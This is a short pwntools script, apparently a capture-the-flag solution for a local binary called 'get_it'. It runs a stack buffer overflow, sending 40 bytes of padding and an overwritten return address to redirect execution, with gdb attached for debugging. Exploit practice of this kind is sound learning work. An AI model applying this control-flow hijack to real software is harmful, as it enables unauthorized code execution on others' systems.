from pwn import *

p = process('./get_it')
gdb.attach(p, gdbscript='b *main')

addr = 0x4005b6

payload = b"A" * 5 * 8
payload += p64(addr)

p.sendline(payload)

p.interactive()
